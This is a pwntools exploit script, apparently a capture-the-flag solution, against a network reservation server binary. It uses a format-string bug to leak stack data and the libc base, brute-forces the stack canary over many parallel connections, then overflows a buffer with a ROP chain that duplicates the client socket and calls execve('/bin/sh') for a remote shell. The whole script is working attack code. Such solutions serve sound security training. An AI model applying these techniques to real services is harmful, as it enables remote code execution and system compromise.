import multiprocessing
import pathlib
from typing import Optional, Tuple, Union

from pwn import *

from utils.target import start

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

is_local = sys.argv[1] in {'127.0.0.1', 'localhost'}

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir / 'challenge' / 'server'
libc_path = Path('/usr/lib/x86_64-linux-gnu/libc.so.6') if is_local else parent_dir / 'challenge' / 'libc.so.6'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
libc = ELF(libc_path, checksec=False)

name_offset = 0x4030
client_socket_fd = 0x4


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def leak_stack() -> bytes:
    sd: bytes = b''
    for stack_index in range(1, 9):
        leak_format_str = f'%{stack_index}$p'.encode()

        leak_io = start(exe=str(exe), gdb_script=gdb_script, level=logging.CRITICAL)

        # Overflow name buffer to be a manager
        leak_io.sendlineafter(b'=> ', b'a' * 16)
        leak_io.recvuntil(b'=> Invalid option.')

        # Clear existing reservations
        leak_io.sendlineafter(b'=> ', b'6')

        # Exploit format string vulnerability to leak address
        leak_io.sendlineafter(b'=> ', b'1')
        leak_io.sendlineafter(b'=> ', leak_format_str)

        # Print reservations, skipping the previous ones to get to the leaked data
        leak_io.sendlineafter(b'=> ', b'5')
        leak_io.recvuntil(b'Table for ')
        leaked_data = leak_io.recvline(keepends=False)

        decoded_data = leaked_data.decode()
        if decoded_data == '(nil)':
            decoded_data = '0x0'
        info(f'Leaked stack data: {hex(int(decoded_data, 0))}')
        sd += p64(int(decoded_data, 0))

        # Close the leak client session
        leak_io.sendlineafter(b'=> ', b'3')
        leak_io.close()

    return sd


def exploit_overflow(payload: bytes) -> Union[remote, process]:
    pwn_io = start(exe=str(exe), gdb_script=gdb_script, level=logging.CRITICAL)

    pwn_io.sendlineafter(b'=> ', b'!' * 16)
    pwn_io.recvuntil(b'=> Invalid option.')

    pwn_io.sendlineafter(b'=> ', b'1')
    pwn_io.sendlineafter(b'=> ', b'3')

    pwn_io.sendlineafter(b'=> ', b'2')
    pwn_io.sendlineafter(b'=> ', b'!' * 0xFF)
    pwn_io.sendlineafter(b'=> ', b'y')

    padding = b'!' * 0x8
    pwn_io.sendafter(b'=> ', padding + payload)
    return pwn_io


def brute_force_canary(test_canary: bytes) -> Tuple[bool, bytes]:
    pwn_io = exploit_overflow(test_canary)

    try:
        pwn_io.sendlineafter(b'=> ', b'')
    except EOFError:
        canary_found = False
    else:
        canary_found = True

    pwn_io.close()
    return canary_found, test_canary


info(f'Leaking libc base address...')
stack_data = leak_stack()
libc.address = u64(stack_data[8:16]) - libc.symbols['lseek64'] - (0x7 if is_local else 0xb)
success(f'Leaked libc base address: {hex(libc.address)}')

info('Brute forcing canary...')
canary_data: bytes = b'\x00'
for i in range(7):
    with multiprocessing.Pool(10) as pool:
        test_canaries = map(canary_data.__add__, map(int.to_bytes, range(0x100)))
        for result in pool.imap_unordered(brute_force_canary, test_canaries, chunksize=8):
            if result[0]:
                success(f'Brute forced canary byte: {hex(result[1][-1])}')
                canary_data = result[1]
                break
            else:
                info(f'Incorrectly guessed canary byte: {hex(result[1][-1])}')
        else:
            error(f'Failed to find canary byte {i+1}')

        pool.terminate()

canary = u64(canary_data)
success(f'Brute forced stack canary: {hex(canary)}')

libc_rop = rop.ROP(libc)
libc_rop.call('dup2', [client_socket_fd, 0x0])
libc_rop.call('dup2', [client_socket_fd, 0x1])
libc_rop.call('execve', [next(libc.search(b'/bin/sh')), 0x0, 0x0])

saved_rbp = p64(0x0)
payload = p64(canary) + saved_rbp + libc_rop.chain()
if len(payload) > 0x100:
    error(f'Payload is too large ({len(payload)} > 0x100 bytes)')

info(f'Pwning via ROP...')
pwn_io = exploit_overflow(payload)

success(f'Your shell, just as requested:')
pwn_io.interactive()
